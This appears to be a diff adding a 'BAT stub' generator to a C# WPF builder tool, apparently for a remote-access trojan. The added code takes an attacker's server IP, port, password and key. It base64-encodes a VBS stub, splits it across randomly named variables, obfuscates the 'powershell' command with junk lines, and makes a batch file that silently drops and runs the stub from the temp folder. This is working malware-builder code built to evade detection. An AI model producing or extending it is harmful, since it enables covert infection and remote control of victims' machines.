@@ -3214,6 +3214,206 @@ namespace WpfApp
             return sb.ToString();
         }
 
+        private void GenerateBatButton_Click(object sender, RoutedEventArgs e)
+        {
+            UpdateStatus("Generating BAT stub...");
+            builderOutputTextBox.Text = "Ready to generate stub...";
+
+            string port = builderPortTextBox.Text.Trim();
+            string password = builderPasswordBox.Text.Trim();
+            string serverIp = builderIpTextBox.Text.Trim();
+            string encKey = builderEncryptionKeyTextBox.Text.Trim();
+
+            if (!ValidateBuilderInputs())
+            {
+                BuilderOutput("ERROR: Validation failed — check inputs");
+                UpdateStatus("BAT stub generation failed.");
+                return;
+            }
+
+            SaveSettings();
+
+            bool silentMode = builderSilentCheckBox?.IsChecked == true;
+            BuilderOutput($"Generating BAT stub — {serverIp}:{port} (silent={silentMode})");
+
+            string batCode = GenerateBatCode(port, password, serverIp, encKey, silentMode);
+
+            if (batCode.StartsWith("@rem ERROR"))
+            {
+                BuilderOutput("ERROR: BAT stub generation failed — template not found");
+                UpdateStatus("BAT stub generation failed.");
+                return;
+            }
+
+            BuilderOutput($"BAT stub generated ({batCode.Length} chars)");
+
+            var dialog = new SaveFileDialog
+            {
+                Filter = "Batch file (*.bat)|*.bat",
+                DefaultExt = ".bat",
+                FileName = "Stub.bat"
+            };
+
+            if (dialog.ShowDialog() == true)
+            {
+                File.WriteAllText(dialog.FileName, batCode);
+                AppendLog($"BAT stub saved to {dialog.FileName}");
+                BuilderOutput($"Saved: {dialog.FileName}");
+                UpdateStatus("BAT stub generated and saved.");
+            }
+            else
+            {
+                BuilderOutput("Save cancelled.");
+                UpdateStatus("BAT stub generated (not saved).");
+            }
+        }
+
+        private string GenerateBatCode(string port, string password, string serverIp, string encryptionKey, bool silentMode = false)
+        {
+            // Generate VBS stub (which already runs PowerShell silently with -W Hidden)
+            string vbsCode = GenerateVbsCode(port, password, serverIp, encryptionKey, silentMode);
+            if (vbsCode.StartsWith("' ERROR"))
+            {
+                AppendLog("ERROR: Cannot generate BAT — VBS stub generation failed.");
+                return "@rem ERROR: VBS stub generation failed.";
+            }
+
+            // Base64-encode the VBS content
+            byte[] vbsBytes = Encoding.UTF8.GetBytes(vbsCode);
+            string b64Vbs = Convert.ToBase64String(vbsBytes);
+
+            // PowerShell command: decode base64 → write .vbs → run silently via wscript.exe
+            string psCmd = "$d=[Convert]::FromBase64String($env:B641+$env:B642);$p=[IO.Path]::GetTempPath()+'sv.vbs';[IO.File]::WriteAllBytes($p,$d);Start-Process wscript.exe -ArgumentList $p -WindowStyle Hidden";
+
+            AppendLog($"VBS payload b64: {b64Vbs.Length} chars");
+
+            return GenerateObfuscatedBat(b64Vbs, psCmd);
+        }
+
+        private static string GenerateObfuscatedBat(string b64Payload, string psCmd)
+        {
+            var rng = new Random();
+            var sb = new StringBuilder();
+
+            string VarName() => "x" + Guid.NewGuid().ToString("N").Substring(0, rng.Next(4, 8));
+
+            // ---- UTF-16 BOM ----
+            sb.Append('\xFEFF');
+
+            // ---- @echo off ----
+            sb.AppendLine("@echo off");
+
+            // ---- junk arithmetic at top ----
+            int junkCount = rng.Next(3, 6);
+            for (int i = 0; i < junkCount; i++)
+            {
+                string v = VarName();
+                sb.AppendLine($"set /a {v}={rng.Next(100, 9999)}^{rng.Next(2, 99)}");
+            }
+
+            // ---- obfuscate "powershell" by splitting into 3-4 parts ----
+            string psStr = "powershell";
+            int psParts = rng.Next(3, 5);
+            int psPartSize = (int)Math.Ceiling((double)psStr.Length / psParts);
+            var psVars = new List<string>();
+            for (int i = 0; i < psParts; i++)
+            {
+                int start = i * psPartSize;
+                if (start >= psStr.Length) break;
+                int len = Math.Min(psPartSize, psStr.Length - start);
+                string chunk = psStr.Substring(start, len);
+                string vn = VarName();
+                psVars.Add(vn);
+                sb.AppendLine($"set {vn}={chunk}");
+            }
+
+            // ---- obfuscate "-NoP -C" by splitting into 4-6 parts ----
+            string argStr = "-NoP -C";
+            int argParts = rng.Next(4, 7);
+            int argPartSize = (int)Math.Ceiling((double)argStr.Length / argParts);
+            var argVars = new List<string>();
+            for (int i = 0; i < argParts; i++)
+            {
+                int start = i * argPartSize;
+                if (start >= argStr.Length) break;
+                int len = Math.Min(argPartSize, argStr.Length - start);
+                string chunk = argStr.Substring(start, len);
+                string vn = VarName();
+                argVars.Add(vn);
+                sb.AppendLine($"set {vn}={chunk}");
+            }
+
+            // ---- junk interleave ----
+            for (int i = 0; i < 2; i++)
+            {
+                string v = VarName();
+                sb.AppendLine($"set {v}={Guid.NewGuid().ToString("N").Substring(0, 8)}");
+            }
+
+            // ---- chunk the b64 payload into env vars (small chunks to avoid cmd.exe 8191 limit) ----
+            int chunkCount = Math.Max(8, (int)Math.Ceiling(b64Payload.Length / 1200.0));
+            int chunkSize = (int)Math.Ceiling((double)b64Payload.Length / chunkCount);
+            var b64Vars = new List<string>();
+            for (int i = 0; i < chunkCount; i++)
+            {
+                int start = i * chunkSize;
+                if (start >= b64Payload.Length) break;
+                int len = Math.Min(chunkSize, b64Payload.Length - start);
+                string chunk = b64Payload.Substring(start, len);
+                string vn = VarName();
+                b64Vars.Add(vn);
+                sb.AppendLine($"set {vn}={chunk}");
+            }
+
+            // ---- more junk interleave ----
+            for (int i = 0; i < 2; i++)
+            {
+                string v = VarName();
+                sb.AppendLine($"set /a {v}={rng.Next(100, 9999)}+{rng.Next(10, 999)}");
+            }
+
+            // ---- build PowerShell command that concatenates ALL chunk env vars directly ----
+            // No B64 reconstruction needed — PowerShell reads each chunk var and concatenates
+            string envConcat = string.Join("+", b64Vars.Select(v => "$env:" + v));
+            string fullPsCmd = psCmd.Replace("$env:B641+$env:B642", envConcat);
+
+            // ---- more junk ----
+            for (int i = 0; i < 2; i++)
+            {
+                string v = VarName();
+                sb.AppendLine($"set {v}={rng.Next(1000, 9999)}");
+            }
+
+            // ---- build command name from parts ----
+            string cmdVar1 = VarName();
+            sb.Append($"set {cmdVar1}=");
+            for (int i = 0; i < psVars.Count; i++)
+            {
+                sb.Append($"%{psVars[i]}%");
+            }
+            sb.AppendLine();
+
+            string cmdVar2 = VarName();
+            sb.Append($"set {cmdVar2}=");
+            for (int i = 0; i < argVars.Count; i++)
+            {
+                sb.Append($"%{argVars[i]}%");
+            }
+            sb.AppendLine();
+
+            // ---- junk ----
+            string jvLast = VarName();
+            sb.AppendLine($"set {jvLast}=%random%");
+
+            // ---- execute ----
+            sb.AppendLine($"%{cmdVar1}% %{cmdVar2}% \"{fullPsCmd}\"");
+
+            // ---- cleanup ----
+            sb.AppendLine("endlocal");
+
+            return sb.ToString();
+        }
+
         private async void CompileExeButton_Click(object sender, RoutedEventArgs e)
         {
             UpdateStatus("Compiling EXE...");
